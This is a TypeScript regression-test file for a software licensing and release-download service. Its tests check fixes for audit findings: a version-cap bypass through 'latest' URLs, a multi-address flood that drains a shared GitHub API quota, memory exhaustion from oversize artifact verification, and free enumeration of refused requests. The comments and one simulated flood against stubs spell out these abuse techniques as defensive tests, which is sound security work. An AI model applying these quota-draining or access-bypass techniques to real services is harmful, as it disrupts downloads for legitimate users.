  // REGRESSION GUARD. An over-eager ownership guard that refuses (or churns on) a legitimate,
  // unchanged resync is worse than the bug: every push under `.pkey/` triggers one.
  it("a resync of an UNCHANGED manifest is still a clean no-op", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    const stub = await linkIngest(env, db);
    const catalogBefore = await activeCatalog(db);
    const payloadBefore = await profilePayload(db);
    const cfgBefore = await getReleaseConfig(db, "acme");

    for (const [i, at] of [NOW + 10, NOW + 20, NOW + 30].entries()) {
      const body = await push(env, db, stub, at, `a${i}`);
      expect(body.ok, JSON.stringify(body)).toBe(true);
    }

    // Nothing moved…
    expect(await activeCatalog(db)).toBe(catalogBefore);
    expect(await profilePayload(db)).toBe(payloadBefore);
    expect(await getReleaseConfig(db, "acme")).toEqual(cfgBefore);
    // …so there is nothing to audit. (A resync that logged on every push would bury the real
    // ones and would be its own retention problem.)
    expect(await auditRows(db)).toEqual([]);
    // …and exactly one active catalog version: no version churn from re-publishing.
    const versions = await db.all<{ catalog_version: number }>(
      "SELECT catalog_version FROM product_schema WHERE product = ?",
      "acme",
    );
    expect(versions).toHaveLength(1);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// A5-03 — `entitled` skipped the version window for every UNPINNED selector
// ═════════════════════════════════════════════════════════════════════════════

// FIXED (A5-03). `entitledSelectorFor` can only populate `version` for a PINNED selector, so
// `enforceReleaseAccess` — which runs BEFORE the selector resolves — evaluated the caller's
// version window for `/release/dl/2.0.0/…` and skipped it entirely for `latest`, `stable` and a
// bare channel appcast. The ceiling was therefore a property of the URL SHAPE, not of the grant:
// the same caller, refused the pinned path, got the identical artifact by swapping one segment.
// `assertEntitledVersion` re-asks the question against the RESOLVED release at all three
// post-resolution points, in the same `403 version_blocked` + `allowedRange` shape.
describe("A5-03 entitled skips the version window on an unpinned selector", () => {
  /** A release list whose newest stable is 2.0.0, plus a beta above it. */
  const STABLE_2 = release({
    tag_name: "v2.0.0",
    assets: [asset("djdl-2.0.0-arm64.dmg", 91), asset("djdl-arm64", 92)],
  });
  const STABLE_1 = release({
    tag_name: "v1.0.0",
    published_at: "2025-01-01T00:00:00Z",
    assets: [asset("djdl-1.0.0-arm64.dmg", 93), asset("djdl-arm64", 94)],
  });
  const BETA_3 = release({
    tag_name: "v3.0.0-beta.1",
    prerelease: true,
    published_at: "2026-03-01T00:00:00Z",
    assets: [asset("djdl-3.0.0-beta.1-beta-arm64.dmg", 95)],
  });

  function releaseListFetch(): FetchImpl {
    return stubFetch([
      [
        "/releases?per_page",
        () =>
          new Response(JSON.stringify([BETA_3, STABLE_2, STABLE_1]), {
            status: 200,
          }),
      ],
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(STABLE_2), { status: 200 }),
      ],
    ]).fetchImpl;
  }

  /** An `entitled` product, unsigned feeds, plus an activated device with a capped grant. */
  async function world(
    access: Record<string, unknown>,
    grant: Parameters<typeof seedLicenseWithKey>[2] = {},
  ): Promise<{ db: Db; env: Env; product: Product; token: string }> {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      // No Sparkle key, signature not required: the appcast must render so the test is about
      // the access decision and not about the enclosure.
      sparkle_ed25519_pub: null,
      artifact_policy_json: JSON.stringify({ requireSparkleSignature: false }),
      // No channel workflow, so `beta` resolves through the prerelease heuristic rather than
      // an Actions lookup this stub does not serve.
      channel_workflow: null,
      ...access,
    });
    const env = envFor();
    const product = (await loadProduct(env, db, SLUG))!;
    const { key } = await seedLicenseWithKey(db, SLUG, grant);
    const activated = await handleActivate(
      mkReq("POST", {
        authorization: `Bearer ${key}`,
        "x-pkey-device": "dev-a503",
      }),
      env,
      db,
      product,
      NOW,
    );
    expect(activated.status).toBe(200);
    const { token } = (await activated.json()) as { token: string };
    return { db, env, product, token };
  }

  function authed(url: string, token: string): Request {
    return new Request(url, {
      headers: { authorization: `Bearer ${token}` },
    }) as unknown as Request;
  }

  it("blocks `latest` for a caller whose grant caps below the newest release", async () => {
    const { db, env, product, token } = await world(
      { artifacts_access: "entitled" },
      { maxVersion: "1.5.0" },
    );
    const res = await handleRelease(
      authed(
        "https://key.plrs.im/djdl/release/dl/latest/djdl-arm64.dmg",
        token,
      ),
      env,
      db,
      product,
      "dmg",
      { version: "latest", arch: "arm64" },
      releaseListFetch(),
    );
    expect(res.status).toBe(403);
    expect(await res.json()).toEqual({
      error: { code: "version_blocked" },
      // The SAME body the pinned path already answered with — clients parse this shape, and a
      // second one would be a second contract.
      allowedRange: { min: "0.0.0", max: "1.5.0" },
    });
  });

  it("blocks the bare appcast, which names no version at all", async () => {
    const { db, env, product, token } = await world(
      { artifacts_access: "entitled" },
      { maxVersion: "1.5.0" },
    );
    const res = await handleRelease(
      authed("https://key.plrs.im/djdl/update/appcast.xml", token),
      env,
      db,
      product,
      "appcast",
      { arch: "arm64" },
      releaseListFetch(),
    );
    expect(res.status).toBe(403);
    expect(await res.json()).toMatchObject({
      error: { code: "version_blocked" },
    });
  });

  it("blocks the CHANNEL appcast for a beta-entitled caller who is version-capped", async () => {
    // The channel gate passes (the grant names `beta`) and the version gate is the only thing
    // left — which is exactly the combination the pre-resolution check could not evaluate.
    const { db, env, product, token } = await world(
      { artifacts_access: "entitled" },
      { channels: ["beta"], maxVersion: "2.5.0" },
    );
    const res = await handleRelease(
      authed("https://key.plrs.im/djdl/update/beta/appcast.xml", token),
      env,
      db,
      product,
      "channelAppcast",
      { channel: "beta", arch: "arm64" },
      releaseListFetch(),
    );
    expect(res.status).toBe(403);
    expect(await res.json()).toMatchObject({
      error: { code: "version_blocked" },
    });
  });

  it("blocks /update/version, which ADVERTISES the release it may not serve", async () => {
    const { db, env, product, token } = await world(
      { metadata_access: "entitled" },
      { maxVersion: "1.5.0" },
    );
    const res = await handleRelease(
      authed("https://key.plrs.im/djdl/update/version", token),
      env,
      db,
      product,
      "version",
      { version: "latest" },
      releaseListFetch(),
    );
    expect(res.status).toBe(403);
    expect(await res.json()).toMatchObject({
      error: { code: "version_blocked" },
    });
  });

  // REGRESSION GUARD. Over-blocking here would break every legitimate updater on an `entitled`
  // product, which is a worse outage than the finding.
  it("still serves the unpinned selector to a caller INSIDE the window", async () => {
    const { db, env, product, token } = await world(
      { artifacts_access: "entitled", metadata_access: "entitled" },
      { maxVersion: "9.0.0" },
    );

    const feed = await handleRelease(
      authed("https://key.plrs.im/djdl/update/appcast.xml", token),
      env,
      db,
      product,
      "appcast",
      { arch: "arm64" },
      releaseListFetch(),
    );
    expect(feed.status).toBe(200);
    expect(await feed.text()).toContain("djdl-2.0.0-arm64.dmg");

    const version = await handleRelease(
      authed("https://key.plrs.im/djdl/update/version", token),
      env,
      db,
      product,
      "version",
      { version: "latest" },
      releaseListFetch(),
    );
    expect(version.status).toBe(200);
    expect(((await version.json()) as { version: string }).version).toBe(
      "2.0.0",
    );

    const dl = await handleRelease(
      authed(
        "https://key.plrs.im/djdl/release/dl/latest/djdl-arm64.dmg",
        token,
      ),
      env,
      db,
      product,
      "dmg",
      { version: "latest", arch: "arm64" },
      releaseListFetch(),
    );
    // Not 200 only because the stub serves no asset BYTES; the point is that the access
    // decision let the request through to the surface.
    expect(dl.status).not.toBe(403);
  });

  // The mode is opt-in. A `public` product must not pay for any of this.
  it("does not touch a product that has not opted in", async () => {
    const { db, env, product } = await world({}, { maxVersion: "0.0.1" });
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/update/version"),
      env,
      db,
      product,
      "version",
      { version: "latest" },
      releaseListFetch(),
    );
    expect(res.status).toBe(200);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// B5-02 — the per-IP budgets sat ABOVE the upstream quota they exist to defend
// ═════════════════════════════════════════════════════════════════════════════
//
// R10-05 metered the release surface PER IP and sized the lanes as if a request were one GitHub
// subrequest. An artifact request is two — `resolveSelector` (`/releases/tags/…`) then
// `streamAsset` (`/releases/assets/<id>`) — so the 120/min artifact lane licensed 14,400 calls
// an hour from ONE address against an installation quota of 5,000. And because every lane was
// keyed on the caller, the whole defence cost an attacker exactly one thing to defeat: more
// source addresses. Nothing anywhere counted what the PRODUCT was spending, which is the only
// number the quota cares about, and exhausting it 404s (now 503s) every download, every appcast
// and `install.sh` for every product sharing that installation.
//
// GREEN when the flood cannot spend more than the product's own budget, no matter how many
// addresses it comes from.

describe("B5-02 an artifact flood drains the product's whole GitHub quota", () => {
  /** A release fetch stub that counts the calls GitHub actually bills — `api.github.com` only. */
  function meteredStub(rel: Release): {
    fetchImpl: FetchImpl;
    apiCalls: () => number;
  } {
    let apiCalls = 0;
    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      // The storage redirect (`objects.githubusercontent.com`) is a signed CDN URL and is not
      // billed to the App's REST quota, so it is deliberately not counted here either.
      if (new URL(url).hostname === "api.github.com") apiCalls += 1;
      if (url.includes("/access_tokens")) {
        return new Response(
          JSON.stringify({ token: "ghs_installation_token" }),
          {
            status: 200,
          },
        );
      }
      if (url.includes("/releases/tags/"))
        return new Response(JSON.stringify(rel), { status: 200 });
      if (url.includes("/releases/assets/"))
        return new Response("BINARY", { status: 200 });
      return new Response("not found", { status: 404 });
    };
    return { fetchImpl, apiCalls: () => apiCalls };
  }

  /** One artifact request, attributed to `ip` — `cf-connecting-ip` is what `clientIp` reads. */
  function fromIp(ip: string): Request {
    return new Request("https://key.plrs.im/djdl/release/dl/1.2.3/djdl-arm64", {
      headers: { "cf-connecting-ip": ip },
    }) as unknown as Request;
  }

  it("an unauthenticated artifact flood cannot exceed the per-product upstream budget", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, { channel_workflow: null });
    const env = envFor();
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl, apiCalls } = meteredStub(rel);

    // Two GitHub calls per request, so this flood is worth ~10% MORE than the budget: without
    // a per-product charge it would land ~4,200 calls on a 4,000-call allowance. Every request
    // comes from a different address, which is what defeats a purely per-IP defence — and is
    // free for anyone with a routed /64 or a botnet.
    const flood = Math.ceil(UPSTREAM_RATE_LIMIT.limit / 2) + 100;
    const statuses: number[] = [];
    for (let i = 0; i < flood; i++) {
      const res = await handleRelease(
        fromIp(`198.51.100.${i % 250}`),
        env,
        db,
        makeProduct(),
        "cli",
        { version: "1.2.3", arch: "arm64" },
        fetchImpl,
      );
      statuses.push(res.status);
    }

    // THE ASSERTION THAT MATTERS: a count of GitHub calls, not a wall-clock measurement.
    // The budget is charged once per call and checked BEFORE the call leaves, so it is an
    // exact ceiling, not an approximation.
    expect(apiCalls()).toBeLessThanOrEqual(UPSTREAM_RATE_LIMIT.limit);
    expect(apiCalls()).toBe(UPSTREAM_RATE_LIMIT.limit);
    // …and the flood really did try to spend more than that.
    expect(flood * 2).toBeGreaterThan(UPSTREAM_RATE_LIMIT.limit);

    // No 429 anywhere: the per-IP lanes never fired, so the bound above is the PRODUCT budget
    // and nothing else. (This is the same reason the old defence failed.)
    expect(statuses.filter((s) => s === 429)).toEqual([]);
    // The requests past the budget are refused, and the last one certainly is.
    expect(statuses.filter((s) => s === 503).length).toBeGreaterThan(0);
    expect(statuses.at(-1)).toBe(503);
    // Serving the early ones is the point — this is a delivery path, not a tarpit.
    expect(statuses.filter((s) => s === 200).length).toBeGreaterThan(1000);

    // An exhausted quota is a PLATFORM condition, so it wears the same 503 shape GitHub's own
    // refusal maps to — never a 404, which is indistinguishable from a withdrawn release and
    // silently stops every auto-updater on the product.
    const refused = await handleRelease(
      fromIp("203.0.113.9"),
      env,
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(refused.status).toBe(503);
    expect(refused.headers.get("cache-control")).toBe("no-store");
    expect(Number(refused.headers.get("retry-after"))).toBeGreaterThan(0);
    expect(await refused.json()).toMatchObject({
      error: "upstream_rate_limited",
    });
    // Still no further spend: the budget cannot be re-borrowed by asking again.
    expect(apiCalls()).toBe(UPSTREAM_RATE_LIMIT.limit);
  }, 120_000);
});

// ═════════════════════════════════════════════════════════════════════════════
// B5-03 / B7-05 — Sparkle verification allocated past the isolate ceiling, and
//                 only ever remembered the verdicts that succeeded
// ═════════════════════════════════════════════════════════════════════════════
//
// `MAX_VERIFY_BYTES` was 256 MiB, directly beneath a comment saying anything larger was not
// verifiable inside a Worker isolate — which has a 128 MB memory limit, so the cap was exactly
// twice the ceiling it claimed to enforce. `fetchAssetBytes` then checked the declared
// `Content-Length` and called `res.arrayBuffer()`, so a 200 MB DMG (or ANY size at all, with the
// header simply omitted) was pulled into the isolate whole: workerd error 1102, taking every
// co-tenant request with it. And since the verdict never became `true`, nothing was memoised, so
// the next appcast request did it again. Forever.

/** A response that declares `bytes` and BOOBY-TRAPS every way of reading its body. */
function oversizeTrap(bytes: number, onBodyTouched: () => void): Response {
  const boom = (): never => {
    onBodyTouched();
    throw new Error("the over-size artifact was allocated");
  };
  return {
    ok: true,
    status: 200,
    headers: new Headers({ "content-length": String(bytes) }),
    get body(): never {
      return boom();
    },
    arrayBuffer: boom,
    text: boom,
    json: boom,
    blob: boom,
  } as unknown as Response;
}

/** A real Ed25519 public key (base64) plus a well-formed 64-byte signature that is not one. */
async function bogusSparkleMaterial(): Promise<{
  publicKey: string;
  signature: string;
}> {
  const b64 = (bytes: Uint8Array): string =>
    btoa(String.fromCharCode(...bytes));
  const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
    "sign",
    "verify",
  ])) as CryptoKeyPair;
  const raw = new Uint8Array(
    (await crypto.subtle.exportKey("raw", pair.publicKey)) as ArrayBuffer,
  );
  return {
    publicKey: b64(raw),
    // Structurally valid (64 bytes, decodable) so verification is actually attempted — the
    // point is the DOWNLOAD, and a malformed signature would be rejected before one happens.
    signature: b64(crypto.getRandomValues(new Uint8Array(64))),
  };
}

/** The single `sparkle-sig` memo this product wrote, if any. */
function sparkleMemoKey(kv: KvMock): string | undefined {
  return kv.keys().find((k) => k.includes(":sparkle-sig:"));
}

describe("B5-03 an over-size DMG is allocated into a 128 MB isolate to verify it", () => {
  it("an over-size artifact is refused without allocating it, and the refusal is memoised", async () => {
    const db = makeTestDb();
    const { publicKey, signature } = await bogusSparkleMaterial();
    await seedReleaseConfig(db, { sparkle_ed25519_pub: publicKey });
    const kv = new KvMock();
    const env = envFor(kv);
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, 4096),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });

    let bodyTouched = 0;
    let dmgFetches = 0;
    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens")) {
        return new Response(
          JSON.stringify({ token: "ghs_installation_token" }),
          {
            status: 200,
          },
        );
      }
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify([rel]), { status: 200 });
      if (url.includes("/releases/assets/101"))
        return new Response(signature, { status: 200 });
      if (url.includes("/releases/assets/100")) {
        dmgFetches += 1;
        // 200 MB — over the 64 MiB verification cap and over the isolate's own ceiling.
        return oversizeTrap(200 * 1024 * 1024, () => {
          bodyTouched += 1;
        });
      }
      return new Response("not found", { status: 404 });
    };

    const first = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      env,
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    // Fails closed — an unverifiable enclosure never enters the feed…
    expect(first.status).toBe(404);
    // …and NOTHING read the body. The declared length is consulted before the stream is
    // touched, so the refusal costs one header read, not 200 MB of isolate memory.
    expect(bodyTouched).toBe(0);
    expect(dmgFetches).toBe(1);

    // The refusal is remembered, so the next appcast request does not repeat the attempt. This
    // is the half that made the bug self-sustaining: a `false` verdict was never written, so
    // every single request re-ran it.
    const memo = sparkleMemoKey(kv);
    expect(memo).toBeDefined();
    expect(await kv.get(memo!)).toBe("0");

    const second = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      env,
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(second.status).toBe(404);
    expect(dmgFetches).toBe(1);
    expect(bodyTouched).toBe(0);
  });

  it("an ABSENT Content-Length cannot smuggle the artifact past the cap either", async () => {
    // The declared length is a cheap first rejection, not the bound. With no header at all the
    // old code read `0`, sailed through the check and called `arrayBuffer()` on the lot.
    const db = makeTestDb();
    const { publicKey, signature } = await bogusSparkleMaterial();
    await seedReleaseConfig(db, { sparkle_ed25519_pub: publicKey });
    const env = envFor();
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, 4096),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });

    // 128 MiB of 1 MiB chunks, offered without a Content-Length. Counts what is actually pulled.
    let pulled = 0;
    const hugeBody = (): ReadableStream<Uint8Array> =>
      new ReadableStream<Uint8Array>({
        pull(controller) {
          if (pulled >= 128) {
            controller.close();
            return;
          }
          pulled += 1;
          controller.enqueue(new Uint8Array(1024 * 1024));
        },
      });

    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens")) {
        return new Response(
          JSON.stringify({ token: "ghs_installation_token" }),
          {
            status: 200,
          },
        );
      }
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify([rel]), { status: 200 });
      if (url.includes("/releases/assets/101"))
        return new Response(signature, { status: 200 });
      if (url.includes("/releases/assets/100"))
        return new Response(hugeBody(), { status: 200 });
      return new Response("not found", { status: 404 });
    };

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      env,
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    // Cancelled a chunk past the 64 MiB cap rather than buffering all 128 MiB.
    expect(pulled).toBeLessThanOrEqual(66);
    expect(pulled).toBeLessThan(128);
  });
});

describe("B7-05 only successful Sparkle verdicts are memoised", () => {
  it("a failing sidecar downloads once per TTL, not once per request", async () => {
    const db = makeTestDb();
    const { publicKey, signature } = await bogusSparkleMaterial();
    await seedReleaseConfig(db, { sparkle_ed25519_pub: publicKey });
    const kv = new KvMock();
    const env = envFor(kv);
    // A small DMG, so this test is purely about HOW OFTEN it is downloaded — not about size.
    const dmgBytes = new TextEncoder().encode("REAL-DMG-BYTES");
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, dmgBytes.byteLength),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });

    let dmgFetches = 0;
    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens")) {
        return new Response(
          JSON.stringify({ token: "ghs_installation_token" }),
          {
            status: 200,
          },
        );
      }
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify([rel]), { status: 200 });
      if (url.includes("/releases/assets/101"))
        return new Response(signature, { status: 200 });
      if (url.includes("/releases/assets/100")) {
        dmgFetches += 1;
        return new Response(dmgBytes as unknown as BodyInit, { status: 200 });
      }
      return new Response("not found", { status: 404 });
    };

    // Five appcast renders — a Sparkle fleet checking in, or one attacker in a loop. Before
    // this, EACH of them re-downloaded the whole artifact because only `true` was ever cached.
    for (let i = 0; i < 5; i++) {
      const res = await handleRelease(
        req("https://key.plrs.im/djdl/appcast.xml"),
        env,
        db,
        makeProduct(),
        "appcast",
        {},
        fetchImpl,
      );
      expect(res.status).toBe(404);
    }
    expect(dmgFetches).toBe(1);

    // The memo is unambiguous — a stored "0" is a cached REFUSAL, not the absence of an entry.
    const memo = sparkleMemoKey(kv);
    expect(memo).toBeDefined();
    expect(await kv.get(memo!)).toBe("0");
    // …and it is deliberately short-lived: a refusal can be a transient truth (a half-uploaded
    // sidecar, a key not yet rotated), so it expires in minutes where a success lasts a day.
    expect(kv.ttlOf(memo!)).toBe(300);
  });

  it("CONTRAST: a verdict that VERIFIES is memoised for a day, not five minutes", async () => {
    const db = makeTestDb();
    const dmgBytes = new TextEncoder().encode("REAL-DMG-BYTES");
    const b64 = (bytes: Uint8Array): string =>
      btoa(String.fromCharCode(...bytes));
    const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
      "sign",
      "verify",
    ])) as CryptoKeyPair;
    const pub = b64(
      new Uint8Array(
        (await crypto.subtle.exportKey("raw", pair.publicKey)) as ArrayBuffer,
      ),
    );
    const sigB64 = b64(
      new Uint8Array(
        await crypto.subtle.sign(
          { name: "Ed25519" },
          pair.privateKey,
          dmgBytes as BufferSource,
        ),
      ),
    );
    await seedReleaseConfig(db, { sparkle_ed25519_pub: pub });
    const kv = new KvMock();
    const env = envFor(kv);
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, dmgBytes.byteLength),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
      ["/releases/assets/101", () => new Response(sigB64)],
      [
        "/releases/assets/100",
        () => new Response(dmgBytes as unknown as BodyInit),
      ],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      env,
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(200);
    const memo = sparkleMemoKey(kv);
    expect(memo).toBeDefined();
    expect(await kv.get(memo!)).toBe("1");
    expect(kv.ttlOf(memo!)).toBe(86_400);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// A5-05 — a refused request was unmetered, so refusals were free to enumerate
// ═════════════════════════════════════════════════════════════════════════════

describe("A5-05 access enforcement runs before the limiter, so refusals cost nothing", () => {
  it("an unauthenticated caller cannot enumerate a licensed surface for free", async () => {
    const db = makeTestDb();
    // `licensed` metadata: an anonymous caller gets 401 for every selector it names.
    await seedReleaseConfig(db, { metadata_access: "licensed" });
    const env = envFor();
    const { fetchImpl, calls } = stubFetch([]);

    const statuses: number[] = [];
    for (let i = 0; i < 40; i++) {
      const res = await handleRelease(
        req(`https://key.plrs.im/djdl/update/version?v=${i}`),
        env,
        db,
        makeProduct(),
        "version",
        { version: `1.2.${i}` },
        fetchImpl,
      );
      statuses.push(res.status);
    }

    // The first 30 are refused on their merits; past the metadata budget the limiter takes
    // over, because being turned away is work the platform did on a stranger's behalf.
    expect(statuses.slice(0, 30).every((s) => s === 401)).toBe(true);
    expect(statuses[30]).toBe(429);
    expect(statuses.at(-1)).toBe(429);
    // Nothing ever reached GitHub — enforcement still precedes every byte of release state.
    expect(calls).toEqual([]);
  });

  it("REGRESSION GUARD: the cache lookup stays ahead of the limiter", async () => {
    // A hit costs zero GitHub subrequests and zero limiter round-trips, so it must never be
    // metered — that is the availability half of R10-05 and the reason the order is
    // cache → limit → enforce and not limit → cache.
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const env = envFor();
    const rel = release({ tag_name: "v1.2.3" });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
    ]);
    const cache = new Map<string, Response>();
    const g = globalThis as { caches?: unknown };
    const prior = g.caches;
    g.caches = {
      default: {
        match: async (r: Request) => cache.get(r.url)?.clone(),
        put: async (r: Request, res: Response) => {
          cache.set(r.url, res);
        },
      },
    };
    try {
      const hit = async (): Promise<number> =>
        (
          await handleRelease(
            req("https://key.plrs.im/djdl/update/version"),
            env,
            db,
            makeProduct(),
            "version",
            { version: "latest" },
            fetchImpl,
          )
        ).status;
      expect(await hit()).toBe(200);
      // Burn the whole per-IP metadata budget on misses…
      for (let i = 0; i < 40; i++) {
        await handleRelease(
          req("https://key.plrs.im/djdl/update/version"),
          env,
          db,
          makeProduct(),
          "version",
          { version: `9.9.${i}` },
          fetchImpl,
        );
      }
      // …and the cached selector still serves.
      expect(await hit()).toBe(200);
    } finally {
      if (prior === undefined) delete g.caches;
      else g.caches = prior;
    }
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// A5-06 — two regexes disagreed, so a legal binary name 404'd install.sh forever
// ═════════════════════════════════════════════════════════════════════════════
//
// `install.ts` bounded `binaryName` with exactly the manifest validator's class, then bounded the
// DERIVED `versionEnv` with a shell-identifier class — but the derivation lived in `surfaces.ts`
// and satisfied neither bound. Two axes:
//   (a) a LEADING DIGIT. `7zip` is a legal binaryName; `7ZIP_VERSION` is not a legal shell
//       identifier, so `validateInstallContext` failed and the surface 404'd.
//   (b) LENGTH. `binaryName` may be 64 characters; `<NAME>_VERSION` is 8 longer, over the old
//       64-character bound. Every name of 57-64 characters 404'd.
// Both were permanent: nothing about the request changed the answer.

describe("A5-06 a manifest-legal binaryName permanently 404s install.sh", () => {
  /** The manifest validator's rule, verbatim from `shared-manifest/src/index.ts`. */
  const MANIFEST_BINARY_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/;

  async function installFor(binaryName: string): Promise<Response> {
    const db = makeTestDb();
    await seedReleaseConfig(db, { binary_name: binaryName });
    const { fetchImpl } = stubFetch([]);
    return handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
  }

  // AXIS (a). A leading digit is genuinely not a POSIX shell identifier, so the regex was
  // right and the derivation was wrong: the fix prefixes `_` rather than loosening the class.
  it("a binaryName starting with a digit serves an installer instead of a 404", async () => {
    const name = "7zip";
    expect(MANIFEST_BINARY_NAME_RE.test(name)).toBe(true);
    const res = await installFor(name);
    expect(res.status).toBe(200);
    const script = await res.text();
    expect(script).toContain("_7ZIP_VERSION");
    // Never the un-prefixed form ANYWHERE: `7ZIP_VERSION=1.2.3 sh` is a COMMAND named
    // `7ZIP_VERSION=…`, not an assignment, so an installer that emitted it would be quietly
    // broken even if the renderer had agreed to emit it.
    expect(script).not.toMatch(/(?:^|[^A-Za-z0-9_])7ZIP_VERSION/m);
    expect(script).toContain('VERSION="${_7ZIP_VERSION:-latest}"');
  });

  // AXIS (b). 64 characters is exactly what the manifest admits; the derived name is 72.
  it("a maximum-length binaryName serves an installer instead of a 404", async () => {
    const name = "a".repeat(64);
    expect(MANIFEST_BINARY_NAME_RE.test(name)).toBe(true);
    const res = await installFor(name);
    expect(res.status).toBe(200);
    expect(await res.text()).toContain(`${"A".repeat(64)}_VERSION`);
  });

  // The two rules are now one rule, so the property holds for the WHOLE class rather than for
  // the cases someone remembered: every string the manifest admits derives a name the installer
  // admits. The boundaries above are the two that used to fail; these are the rest of the class.
  it("EVERY manifest-legal binaryName derives an installer-legal versionEnv", () => {
    const names = [
      "a",
      "Z",
      "0",
      "9",
      "7zip",
      "djdl",
      "my.tool",
      "my-tool",
      "my_tool",
      "0-._-.0",
      "a".repeat(64),
      `9${"b".repeat(63)}`,
      `${"x".repeat(63)}9`,
    ];
    for (const name of names) {
      expect(MANIFEST_BINARY_NAME_RE.test(name), name).toBe(true);
      const env = deriveVersionEnv(name);
      // The shell-identifier rule, verbatim from `install.ts`.
      expect(
        /^[A-Za-z_][A-Za-z0-9_]{0,72}$/.test(env),
        `${name} -> ${env}`,
      ).toBe(true);
      expect(
        validateInstallContext({
          origin: "https://key.plrs.im",
          cliBase: "/djdl/release/dl",
          installPath: "/djdl/release/install.sh",
          binaryName: name,
          channels: ["staging", "beta"],
          versionEnv: env,
        }),
      ).toBeNull();
    }
  });
});
